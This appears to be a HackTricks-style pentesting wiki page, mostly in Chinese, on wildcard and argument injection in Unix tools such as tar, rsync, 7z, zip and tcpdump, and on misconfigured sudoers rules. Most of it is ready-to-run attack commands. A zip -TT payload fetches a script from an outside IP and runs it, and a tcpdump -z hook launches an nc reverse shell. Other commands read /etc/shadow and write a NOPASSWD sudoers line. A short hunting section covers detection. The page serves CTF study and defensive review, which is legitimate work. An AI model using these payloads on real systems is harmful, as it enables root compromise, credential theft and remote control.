# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard（也称为 *glob*）**argument injection** 发生在特权脚本使用未加引号的通配符（如 `*`）运行 `tar`、`chown`、`rsync`、`zip`、`7z` 等 Unix binary 时。
> 由于 shell 会在执行 binary **之前**展开通配符，能够在工作目录中创建文件的攻击者可以构造以 `-` 开头的文件名，使其被解释为**选项而非数据**，从而有效地注入任意 flag，甚至命令。
> 本页面汇集了 2023-2025 年最有用的 primitives、最新研究和现代 detections。

## chown / chmod

通过滥用 `--reference` flag，可以**复制任意文件的 owner/group 或 permission bits**：
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
当 root 稍后执行类似以下内容时：
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn)（combined attack）。
另请参阅经典的 DefenseCode 论文以了解详细信息。

---

## tar

### GNU tar（Linux、*BSD、busybox-full）

通过滥用 **checkpoint** 功能执行任意命令：
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
一旦 root 运行例如 `tar -czf /root/backup.tgz *`，`shell.sh` 就会以 root 身份执行。

### bsdtar / macOS 14+

近期 macOS 上的默认 `tar`（基于 `libarchive`）并未实现 `--checkpoint`，但你仍然可以通过允许指定外部 compressor 的 **--use-compress-program** flag 实现 code-execution。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
当特权 script 运行 `tar -cf backup.tar *` 时，将启动 `/bin/sh`。

---

## rsync

`rsync` 允许你通过以 `-e` 或 `--rsync-path` 开头的命令行 flags 覆盖 remote shell，甚至覆盖 remote binary：
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
如果 root 稍后使用 `rsync -az * backup:/srv/` 归档该目录，注入的 flag 会在远程端启动你的 shell。

*PoC*：[`wildpwn`](https://github.com/localh0t/wildpwn)（`rsync` mode）。

---

## 7-Zip / 7z / 7za

即使特权脚本*防御性地*在 wildcard 前加上 `--`（以阻止 option parsing），7-Zip 格式仍支持通过在文件名开头添加 `@` 来使用 **file list files**。将其与 symlink 结合，即可 *exfiltrate arbitrary files*：
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
如果 root 执行类似以下命令：
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip 会尝试将 `root.txt`（→ `/etc/shadow`）作为文件列表读取，随后退出，**并将其内容打印到 stderr**。

即使使用 `-- *`，这种方式仍然有效，因为 7-Zip CLI 明确接受普通文件名和 `@listfiles` 作为位置参数输入，因此像 `@root.txt` 这样的字面文件名仍会被特殊处理。

---

## zip

当应用程序通过 wildcard 或在不使用 `--` 的情况下枚举文件名，并将用户可控的文件名传递给 `zip` 时，有两个非常实用的 primitive。

- 通过 test hook 实现 RCE：`-T` 启用“test archive”，而 `-TT <cmd>` 会将 tester 替换为任意程序（长选项形式：`--unzip-command <cmd>`）。如果你可以注入以 `-` 开头的文件名，请将 flags 分散到不同的文件名中，以便 short-options parsing 正常工作：
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
注意事项
- 不要尝试使用单个文件名，例如 `'-T -TT <cmd>'` —— 短选项会按字符逐个解析，因此会失败。请像下面这样使用独立的 token。
- 如果应用会从文件名中移除斜杠，请从裸 host/IP 获取内容（默认路径为 `/index.html`），并使用 `-O` 在本地保存，然后执行。
- 你可以使用 `-sc`（显示处理后的 argv）或 `-h2`（更多帮助）调试解析过程，以了解这些 token 是如何被使用的。

示例（zip 3.0 上的本地行为）：
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak：如果 web layer 会回显 `zip` 的 stdout/stderr（在简单的 wrapper 中很常见），注入的 flags（如 `--help`）或错误选项导致的失败信息将出现在 HTTP response 中，从而确认 command-line injection，并帮助调整 payload。

---

## 易受 wildcard injection 影响的其他 binaries（2023-2025 quick list）

以下 commands 曾在现代 CTF 和真实环境中被滥用。payload 始终会以 *filename* 的形式创建在可写目录中，之后该目录将使用 wildcard 进行处理：

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | 读取文件内容 |
| `flock` | `-c <cmd>` | 执行 command |
| `git`   | `-c core.sshCommand=<cmd>` | 通过 git over SSH 执行 command |
| `scp`   | `-S <cmd>` | 启动任意 program，而不是 ssh |

这些 primitives 不如经典的 *tar/rsync/zip* 常见，但在 hunting 时仍值得检查。

---

## Hunting vulnerable wrappers and jobs

近期的 case studies 表明，wildcard/argv injection 已不再只是 **cron + tar** 问题。同类 bug 仍不断出现在：

- 从 attacker-controlled upload directories 中通过 web features “download everything as zip/tar”
- vendor/appliance debug shells 暴露的 **tcpdump** wrapper，其中 filename/filter fields 由 attacker 控制
- 在可写目录上调用 `tar`、`rsync`、`7z`、`zip`、`chown` 或 `chmod` 的 backup 或 rotation jobs

实用的 triage commands：
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
快速判断：

- `-- *` 对许多 GNU tools 来说是很好的修复方式，但对 `7z`/`7za` **不适用**，因为 `@listfiles` 会被单独解析。
- 对于 `zip`，应寻找会直接枚举用户可控 filenames 的 wrappers；即使没有 shell glob，短选项拆分（`-T` + `-TT <cmd>`）仍然有效。
- 对于 `tcpdump`，应特别关注允许你控制 **output file names**、**rotation settings** 或 **capture-file replay** 参数的 wrappers。

---

## tcpdump rotation hooks (-G/-W/-z)：wrappers 中通过 argv injection 实现 RCE

当 restricted shell 或 vendor wrapper 通过拼接用户可控字段（例如“file name”参数）来构建 `tcpdump` command line，且没有进行严格的 quoting/validation 时，你可以偷偷加入额外的 `tcpdump` flags。`-G`（基于时间的 rotation）、`-W`（限制文件数量）和 `-z <cmd>`（post-rotate command）的组合，可以让运行 tcpdump 的用户执行任意 command（在 appliances 上通常是 root）。

前置条件：

- 你可以影响传递给 `tcpdump` 的 `argv`（例如通过 `/debug/tcpdump --filter=... --file-name=<HERE>` 这样的 wrapper）。
- wrapper 不会清理 file name 字段中的空格或以 `-` 开头的 tokens。

经典 PoC（从可写路径执行 reverse shell script）：
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
详情：

- `-G 1 -W 1` 会在第一个匹配的数据包之后强制立即 rotate。
- `-z <cmd>` 会在每次 rotate 时运行一次 post-rotate command。许多 build 会执行 `<cmd> <savefile>`。如果 `<cmd>` 是 script/interpreter，请确保参数处理方式与 payload 相匹配。

无 removable media 变体：

- 如果你有其他写入文件的 primitive（例如允许 output redirection 的独立 command wrapper），请将你的 script 放入已知路径，然后触发 `-z /bin/sh /path/script.sh` 或 `-z /path/script.sh`，具体取决于 platform semantics。
- 某些 vendor wrapper 会 rotate 到 attacker-controllable locations。如果你可以影响 rotated path（symlink/directory traversal），就可以将 `-z` 指向完全由你控制的 content，而无需 external media。

---

## sudoers：tcpdump 配合 wildcards/additional args → arbitrary write/read and root

非常常见的 sudoers anti-pattern：
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Issues
- `*` glob 和宽松的 patterns 只限制第一个 `-w` 参数。`tcpdump` 接受多个 `-w` options；最后一个会生效。
- 该 rule 没有限制其他 options，因此允许使用 `-Z`、`-r`、`-V` 等。

Primitives
- 使用第二个 `-w` 覆盖目标路径（第一个仅用于满足 sudoers）：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 在第一个 `-w` 中使用 `Path traversal` 以逃逸受限目录树：
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 使用 `-Z root` 强制设置输出文件所有权（在任意位置创建 root 所有的文件）：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 通过 `-r` 重放精心构造的 PCAP 来写入任意内容（例如，写入一行 sudoers 配置）：

<details>
<summary>创建一个包含精确 ASCII payload 的 PCAP，并以 root 身份写入</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- 通过 `-V <file>` 进行任意文件读取/secret leak（将其解释为 savefiles 列表）。错误诊断信息通常会回显其中的行，导致内容 leak：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## 参考资料

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump：Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - 完整 Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - 检测到通过 Wildcard Injection 获取 Shell 的潜在行为](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
